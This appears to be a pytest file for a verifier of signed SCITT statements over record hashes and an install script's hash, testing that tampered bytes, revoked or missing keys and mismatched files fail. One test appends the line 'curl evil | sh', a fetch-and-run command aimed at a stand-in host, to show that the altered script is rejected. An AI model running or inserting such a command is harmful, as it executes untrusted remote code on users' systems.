"""verify_statement.py (4 Nov 2026): the SCITT signed statement over fixture 01's record hash.

The fixture statement was signed with a throwaway Ed25519 key (fixtures/01-approval-confirmed.statement-keys.json holds
its public half; the private half was discarded) by xchk-server's scittStatementService.statementFor, so these tests
check the server's bytes with code that shares nothing with the server but the format.
"""
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import verify_statement as vs  # noqa: E402

FX = os.path.join(HERE, "fixtures")
COSE = os.path.join(FX, "01-approval-confirmed.statement.cose")
KEYS = os.path.join(FX, "01-approval-confirmed.statement-keys.json")
BUNDLE = os.path.join(FX, "01-approval-confirmed.bundle.json")
DENIAL = os.path.join(FX, "03-decision-is-a-denial.bundle.json")


def failed(r):
    return [c["check"] for c in r["checks"] if not c["ok"]]


def mutated(tmp_path, fn):
    raw = bytearray(open(COSE, "rb").read())
    fn(raw)
    p = tmp_path / "m.cose"
    p.write_bytes(bytes(raw))
    return str(p)


def test_the_genuine_statement_verifies_with_its_bundle():
    r = vs.verify(COSE, BUNDLE, KEYS)
    assert r["ok"], failed(r)
    assert r["recordHash"] == json.load(open(BUNDLE))["recordHash"]
    assert r["iss"] == "https://in.xchk.io"
    assert r["payloadLocation"].endswith(f"/api/receipt/{r['recordHash']}/bundle")


def test_hash_only_nothing_personal_in_the_bytes():
    raw = open(COSE, "rb").read()
    rec = json.load(open(BUNDLE))["record"]
    for s in (rec["approverEmail"], rec["plate"], rec["attestationId"], rec["summary"][:20]):
        assert s.encode() not in raw, s


def test_no_key_fails_closed():
    r = vs.verify(COSE, BUNDLE, None)   # the bundle pins the real registry key, not the throwaway one
    assert not r["ok"]
    assert any("keyId is available" in c for c in failed(r))


def test_a_revoked_key_fails(tmp_path):
    doc = json.load(open(KEYS))
    doc["revoked"], doc["keys"] = doc["keys"], [{"alg": "ed25519", "keyId": "0000000000000000", "publicKeyRaw": "AA=="}]
    p = tmp_path / "k.json"
    p.write_text(json.dumps(doc))
    r = vs.verify(COSE, None, str(p))
    assert not r["ok"] and any("not revoked" in c for c in failed(r))


def test_a_changed_payload_byte_fails(tmp_path):
    raw = open(COSE, "rb").read()
    payload = bytes.fromhex(json.load(open(BUNDLE))["recordHash"])
    i = raw.index(payload)

    def flip(b):
        b[i + 5] ^= 1
    r = vs.verify(mutated(tmp_path, flip), None, KEYS)
    assert not r["ok"]
    assert "Ed25519 signature over the Sig_structure verifies" in failed(r)
    assert "sub names the same record as the payload" in failed(r)


def test_a_changed_signature_byte_fails(tmp_path):
    r = vs.verify(mutated(tmp_path, lambda b: b.__setitem__(len(b) - 1, b[-1] ^ 1)), None, KEYS)
    assert not r["ok"] and "Ed25519 signature over the Sig_structure verifies" in failed(r)


def test_a_changed_protected_header_fails(tmp_path):
    raw = open(COSE, "rb").read()
    i = raw.index(b"https://in.xchk.io")

    def swap(b):
        b[i + 8] = ord("X")
    r = vs.verify(mutated(tmp_path, swap), None, KEYS)
    assert not r["ok"] and "Ed25519 signature over the Sig_structure verifies" in failed(r)


def test_trailing_bytes_fail(tmp_path):
    r = vs.verify(mutated(tmp_path, lambda b: b.extend(b"\x00")), None, KEYS)
    assert not r["ok"] and "trailing" in failed(r)[0]


def test_another_records_bundle_fails():
    r = vs.verify(COSE, DENIAL, KEYS)
    assert not r["ok"]
    assert "payload equals the bundle's recordHash" in failed(r)


def test_cli_exit_codes(capsys):
    assert vs.main([COSE, "--keys", KEYS, "--bundle", BUNDLE]) == 0
    assert vs.main([COSE]) == 1
    assert vs.main([]) == 2
    assert vs.main([COSE, "--keys"]) == 2


def test_the_live_example_verifies_against_the_registry_keys():
    """examples/: a statement downloaded from https://in.xchk.io on 4 Nov 2026 for the same record, signed by the
    registry's own key, checked against the key document the registry published that day."""
    ex = os.path.join(os.path.dirname(HERE), "examples")
    r = vs.verify(os.path.join(ex, "xchk-scitt-aa2bfd5b1d9b.cose"), os.path.join(ex, "xchk-receipt-aa2bfd5b1d9b.json"),
                  os.path.join(ex, "in.xchk.io-xchk-keys.json"))
    assert r["ok"], failed(r)


# A FILE'S STATEMENT (28 Nov 2026): the registry signs the hash of its install script so that what is run is what was
# read. The fixture was signed by xchk-server's scittStatementService.installStatementFor with a throwaway key
# (install.fixture-keys.json holds its public half; the private half was discarded).
INSTALL_COSE = os.path.join(FX, "install.fixture.cose")
INSTALL_SH = os.path.join(FX, "install.fixture.sh")
INSTALL_KEYS = os.path.join(FX, "install.fixture-keys.json")


def test_a_files_statement_verifies_against_the_file_that_was_signed():
    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, INSTALL_SH)
    assert r["ok"], failed(r)
    assert r["payloadLocation"] == "https://in.xchk.io/api/install"
    assert r["preimageContentType"] == "text/x-shellscript"


def test_a_changed_file_fails(tmp_path):
    p = tmp_path / "changed.sh"
    p.write_bytes(open(INSTALL_SH, "rb").read() + b"curl evil | sh\n")
    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, str(p))
    assert not r["ok"] and "payload equals sha256 of the file's bytes" in failed(r)


def test_a_files_statement_is_not_a_records_and_a_records_is_not_a_files():
    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS)            # no --file: judged as a record's statement
    assert not r["ok"] and "sub names the same record as the payload" in failed(r)
    r = vs.verify(COSE, None, KEYS, INSTALL_SH)                 # a record's statement offered for a file
    assert not r["ok"] and any("urn:xchk:install:" in c for c in failed(r))


def test_a_files_statement_needs_the_registrys_key_and_takes_no_bundle():
    r = vs.verify(INSTALL_COSE, None, None, INSTALL_SH)
    assert not r["ok"] and any("a key with this keyId is available" in c for c in failed(r)), "no key: closed"
    r = vs.verify(INSTALL_COSE, BUNDLE, INSTALL_KEYS, INSTALL_SH)
    assert not r["ok"] and "a file's statement is checked against the file, not a receipt bundle" in failed(r)


def test_a_missing_file_fails(tmp_path):
    r = vs.verify(INSTALL_COSE, None, INSTALL_KEYS, str(tmp_path / "nothing-here.sh"))
    assert not r["ok"] and any(c.startswith("the file reads") for c in failed(r))
